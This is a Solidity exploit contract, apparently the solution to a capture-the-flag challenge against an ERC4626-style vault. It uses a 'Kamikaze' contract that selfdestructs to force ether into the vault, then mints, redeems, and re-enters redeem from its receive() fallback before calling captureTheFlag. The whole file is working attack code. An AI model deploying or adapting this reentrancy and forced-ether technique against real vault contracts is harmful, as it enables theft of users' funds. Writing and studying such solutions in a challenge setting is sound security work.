// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC4626 {
  function redeem(uint256 assets,address receiver, address owner) external returns (uint256);
  function mint(uint256 assets, address receiver) external payable returns (uint256);
  function totalSupply() external view returns (uint256);
  function totalAssets() external view returns (uint256);
  function captureTheFlag(address newFlagHolder) external;
}

contract Kamikaze {
  constructor (address payable target) payable {
    selfdestruct(target);
  }
}

contract Exploit {
  IERC4626 private target;
  uint256 private i = 0;
  constructor(address _vault) {
    target = IERC4626(_vault);
  }

  function run(address attacker) external payable {

    uint256 assets = msg.value / 2;

    Kamikaze soldier = new Kamikaze{ value: assets }(payable(address(target)));

    target.mint{ value: assets }(assets, address(this));
    target.redeem(assets, address(this), address(this));

    target.captureTheFlag(attacker);
  }
  
  receive () external payable {
    if(target.totalAssets() > 1 && i < 2) {
      i += 1;
      target.redeem(0, address(this), address(this));
    }
  }
}